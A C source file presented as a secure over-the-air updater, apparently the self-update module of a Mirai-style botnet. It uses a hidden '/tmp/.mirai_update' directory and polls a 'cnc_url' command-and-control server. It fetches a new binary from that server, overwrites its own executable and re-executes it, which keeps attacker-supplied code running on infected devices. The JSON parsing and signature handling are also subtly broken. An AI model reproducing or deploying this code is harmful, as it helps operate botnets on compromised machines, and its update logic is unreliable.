/**
 * @file self_update.c
 * @brief Secure OTA update implementation
 */

#define _GNU_SOURCE
#include <curl/curl.h>
#include <errno.h>
#include <fcntl.h>
#include <sodium.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

#include "../common/crypto.h"
#include "../common/logger.h"
#include "self_update.h"

#define UPDATE_TEMP_DIR "/tmp/.mirai_update"
#define BACKUP_SUFFIX ".backup"

struct update_context {
  char cnc_url[512];
  uint8_t public_key[crypto_sign_PUBLICKEYBYTES];
  update_status_t status;
  char current_binary_path[512];
  char backup_path[512];
  CURL *curl;
};

// HTTP download callback
static size_t download_callback(void *contents, size_t size, size_t nmemb,
                                void *userp) {
  FILE *fp = (FILE *)userp;
  return fwrite(contents, size, nmemb, fp);
}

update_context_t *update_init(const char *cnc_url,
                              const char *public_key_path) {
  // Initialize libsodium
  if (sodium_init() < 0) {
    log_error("Failed to initialize libsodium");
    return NULL;
  }

  update_context_t *ctx = calloc(1, sizeof(update_context_t));
  if (ctx == NULL) {
    log_error("Failed to allocate update context");
    return NULL;
  }

  strncpy(ctx->cnc_url, cnc_url, sizeof(ctx->cnc_url) - 1);
  ctx->status = UPDATE_STATUS_IDLE;

  // Load public key for signature verification
  if (public_key_path) {
    FILE *fp = fopen(public_key_path, "rb");
    if (fp) {
      size_t key_bytes =
          fread(ctx->public_key, 1, crypto_sign_PUBLICKEYBYTES, fp);
      if (key_bytes != crypto_sign_PUBLICKEYBYTES) {
        log_error("Failed to read public key: expected %d bytes, got %zu",
                  crypto_sign_PUBLICKEYBYTES, key_bytes);
        fclose(fp);
        free(ctx);
        return NULL;
      }
      fclose(fp);
    } else {
      log_warn("Could not load public key from %s", public_key_path);
    }
  }

  // Get current binary path
  ssize_t len = readlink("/proc/self/exe", ctx->current_binary_path,
                         sizeof(ctx->current_binary_path) - 1);
  if (len > 0) {
    ctx->current_binary_path[len] = '\0';
    snprintf(ctx->backup_path, sizeof(ctx->backup_path), "%s%s",
             ctx->current_binary_path, BACKUP_SUFFIX);
  }

  // Initialize curl
  curl_global_init(CURL_GLOBAL_DEFAULT);
  ctx->curl = curl_easy_init();

  // Create temp directory
  mkdir(UPDATE_TEMP_DIR, 0700);

  log_info("Update system initialized: cnc=%s", cnc_url);

  return ctx;
}

bool update_check_available(update_context_t *ctx, const char *current_version,
                            update_metadata_t *metadata) {
  if (ctx == NULL || metadata == NULL)
    return false;

  ctx->status = UPDATE_STATUS_CHECKING;

  // Build update check URL
  char url[1024];
  snprintf(url, sizeof(url), "%s/api/update/check?version=%s", ctx->cnc_url,
           current_version);

  log_info("Checking for updates: %s", url);

  // Download metadata
  FILE *fp = tmpfile();
  if (fp == NULL) {
    log_error("Failed to create temp file");
    ctx->status = UPDATE_STATUS_FAILED;
    return false;
  }

  curl_easy_setopt(ctx->curl, CURLOPT_URL, url);
  curl_easy_setopt(ctx->curl, CURLOPT_WRITEFUNCTION, download_callback);
  curl_easy_setopt(ctx->curl, CURLOPT_WRITEDATA, fp);
  curl_easy_setopt(ctx->curl, CURLOPT_TIMEOUT, 30L);

  CURLcode res = curl_easy_perform(ctx->curl);

  if (res != CURLE_OK) {
    log_error("Update check failed: %s", curl_easy_strerror(res));
    fclose(fp);
    ctx->status = UPDATE_STATUS_FAILED;
    return false;
  }

  // Parse JSON response (simplified - in production use json-c)
  rewind(fp);
  char buffer[2048];
  size_t n = fread(buffer, 1, sizeof(buffer) - 1, fp);
  buffer[n] = '\0';
  fclose(fp);

  // Check if update available
  if (strstr(buffer, "\"update_available\":true") != NULL) {
    // Parse metadata (simplified)
    sscanf(buffer, "\"version\":\"%31[^\"]\"", metadata->version);
    sscanf(buffer, "\"build_number\":%u", &metadata->build_number);
    sscanf(buffer, "\"binary_size\":%lu", &metadata->binary_size);
    sscanf(buffer, "\"download_url\":\"%511[^\"]\"", metadata->download_url);

    log_info("Update available: version=%s, build=%u, size=%lu",
             metadata->version, metadata->build_number, metadata->binary_size);

    ctx->status = UPDATE_STATUS_IDLE;
    return true;
  }

  log_info("No updates available");
  ctx->status = UPDATE_STATUS_IDLE;
  return false;
}

int update_download(update_context_t *ctx, update_metadata_t *metadata,
                    const char *output_path) {
  if (ctx == NULL || metadata == NULL || output_path == NULL)
    return -1;

  ctx->status = UPDATE_STATUS_DOWNLOADING;

  log_info("Downloading update from: %s", metadata->download_url);

  FILE *fp = fopen(output_path, "wb");
  if (fp == NULL) {
    log_error("Failed to open output file: %s", strerror(errno));
    ctx->status = UPDATE_STATUS_FAILED;
    return -1;
  }

  curl_easy_setopt(ctx->curl, CURLOPT_URL, metadata->download_url);
  curl_easy_setopt(ctx->curl, CURLOPT_WRITEFUNCTION, download_callback);
  curl_easy_setopt(ctx->curl, CURLOPT_WRITEDATA, fp);
  curl_easy_setopt(ctx->curl, CURLOPT_FOLLOWLOCATION, 1L);
  curl_easy_setopt(ctx->curl, CURLOPT_TIMEOUT, 300L); // 5 minute timeout

  CURLcode res = curl_easy_perform(ctx->curl);

  fclose(fp);

  if (res != CURLE_OK) {
    log_error("Download failed: %s", curl_easy_strerror(res));
    unlink(output_path);
    ctx->status = UPDATE_STATUS_FAILED;
    return -1;
  }

  // Verify file size
  struct stat st;
  if (stat(output_path, &st) == 0) {
    if ((uint64_t)st.st_size != metadata->binary_size) {
      log_error("Downloaded file size mismatch: expected %lu, got %ld",
                metadata->binary_size, st.st_size);
      unlink(output_path);
      ctx->status = UPDATE_STATUS_FAILED;
      return -1;
    }
  }

  log_info("Download complete: %s (%lu bytes)", output_path,
           metadata->binary_size);

  ctx->status = UPDATE_STATUS_IDLE;
  return 0;
}

bool update_verify_signature(update_context_t *ctx, const char *binary_path,
                             const uint8_t *expected_signature) {
  if (ctx == NULL || binary_path == NULL || expected_signature == NULL) {
    return false;
  }

  ctx->status = UPDATE_STATUS_VERIFYING;

  log_info("Verifying signature: %s", binary_path);

  // Read entire file
  FILE *fp = fopen(binary_path, "rb");
  if (fp == NULL) {
    log_error("Failed to open binary: %s", strerror(errno));
    ctx->status = UPDATE_STATUS_FAILED;
    return false;
  }

  if (fseek(fp, 0, SEEK_END) != 0) {
    log_error("Failed to seek to end of file");
    fclose(fp);
    ctx->status = UPDATE_STATUS_FAILED;
    return false;
  }

  long file_size = ftell(fp);
  if (file_size == -1) {
    log_error("Failed to get file size");
    fclose(fp);
    ctx->status = UPDATE_STATUS_FAILED;
    return false;
  }

  if (file_size > 100 * 1024 * 1024) { // Max 100MB for update file
    log_error("Update file too large: %ld bytes", file_size);
    fclose(fp);
    ctx->status = UPDATE_STATUS_FAILED;
    return false;
  }

  if (fseek(fp, 0, SEEK_SET) != 0) {
    log_error("Failed to seek to start of file");
    fclose(fp);
    ctx->status = UPDATE_STATUS_FAILED;
    return false;
  }

  unsigned char *file_data = malloc(file_size);
  if (file_data == NULL) {
    log_error("Failed to allocate memory for update file");
    fclose(fp);
    ctx->status = UPDATE_STATUS_FAILED;
    return false;
  }

  size_t bytes_read = fread(file_data, 1, file_size, fp);
  if (bytes_read != (size_t)file_size) {
    log_error("Failed to read update file: expected %ld, got %zu", file_size,
              bytes_read);
    free(file_data);
    fclose(fp);
    ctx->status = UPDATE_STATUS_FAILED;
    return false;
  }

  fclose(fp);

  // Verify Ed25519 signature
  int result = crypto_sign_verify_detached(expected_signature, file_data,
                                           file_size, ctx->public_key);

  free(file_data);

  if (result == 0) {
    log_info("Signature verification: SUCCESS");
    ctx->status = UPDATE_STATUS_IDLE;
    return true;
  } else {
    log_error("Signature verification: FAILED");
    ctx->status = UPDATE_STATUS_FAILED;
    return false;
  }
}

int update_apply(update_context_t *ctx, const char *binary_path,
                 update_method_t method) {
  if (ctx == NULL || binary_path == NULL)
    return -1;

  ctx->status = UPDATE_STATUS_APPLYING;

  log_info("Applying update: method=%d", method);

  // Backup current binary
  if (link(ctx->current_binary_path, ctx->backup_path) != 0) {
    log_error("Failed to create backup: %s", strerror(errno));
    ctx->status = UPDATE_STATUS_FAILED;
    return -1;
  }

  log_info("Created backup: %s", ctx->backup_path);

  // Replace binary
  if (rename(binary_path, ctx->current_binary_path) != 0) {
    log_error("Failed to replace binary: %s", strerror(errno));
    ctx->status = UPDATE_STATUS_ROLLBACK;
    update_rollback(ctx);
    return -1;
  }

  // Set executable permissions
  chmod(ctx->current_binary_path, 0755);

  log_info("Update applied successfully");
  ctx->status = UPDATE_STATUS_SUCCESS;

  // Restart if needed
  if (method == UPDATE_METHOD_FULL) {
    log_info("Restarting with new binary...");

    char *args[] = {ctx->current_binary_path, NULL};
    execv(ctx->current_binary_path, args);

    // If we get here, exec failed
    log_error("Failed to restart: %s", strerror(errno));
    update_rollback(ctx);
    return -1;
  }

  return 0;
}

int update_rollback(update_context_t *ctx) {
  if (ctx == NULL)
    return -1;

  log_warn("Rolling back to previous version");

  if (access(ctx->backup_path, F_OK) != 0) {
    log_error("Backup not found: %s", ctx->backup_path);
    return -1;
  }

  if (rename(ctx->backup_path, ctx->current_binary_path) != 0) {
    log_error("Rollback failed: %s", strerror(errno));
    return -1;
  }

  log_info("Rollback successful");
  ctx->status = UPDATE_STATUS_ROLLBACK;

  return 0;
}

update_status_t update_get_status(update_context_t *ctx) {
  return ctx ? ctx->status : UPDATE_STATUS_FAILED;
}

int update_auto_check_and_apply(update_context_t *ctx,
                                const char *current_version, bool auto_apply) {
  if (ctx == NULL || current_version == NULL)
    return -1;

  update_metadata_t metadata = {0};

  // Check for updates
  if (!update_check_available(ctx, current_version, &metadata)) {
    return 0; // No updates available
  }

  if (!auto_apply) {
    log_info("Update available but auto_apply=false");
    return 0;
  }

  // Download
  char download_path[512];
  snprintf(download_path, sizeof(download_path), "%s/update.bin",
           UPDATE_TEMP_DIR);

  if (update_download(ctx, &metadata, download_path) != 0) {
    return -1;
  }

  // Verify signature
  if (!update_verify_signature(ctx, download_path, metadata.signature)) {
    unlink(download_path);
    return -1;
  }

  // Apply update
  if (update_apply(ctx, download_path, metadata.method) != 0) {
    unlink(download_path);
    return -1;
  }

  return 0;
}

void update_cleanup(update_context_t *ctx) {
  if (ctx == NULL)
    return;

  if (ctx->curl) {
    curl_easy_cleanup(ctx->curl);
  }
  curl_global_cleanup();

  free(ctx);

  log_info("Update system cleaned up");
}

// Differential update support (simplified)
int update_generate_patch(const char *old_binary, const char *new_binary,
                          const char *patch_output) {
  // In production, would use bsdiff or similar
  log_warn("Differential patches not yet implemented");
  return -1;
}

int update_apply_patch(const char *current_binary, const char *patch_file,
                       const char *output_binary) {
  // In production, would use bspatch or similar
  log_warn("Differential patches not yet implemented");
  return -1;
}

int update_hot_patch(const void *patch_data, size_t patch_size) {
  // Hot-patching requires:
  // 1. Locating code to patch in memory
  // 2. Making pages writable (mprotect)
  // 3. Applying patch
  // 4. Making pages executable again

  log_warn("Hot-patching not yet implemented (advanced feature)");
  return -1;
}
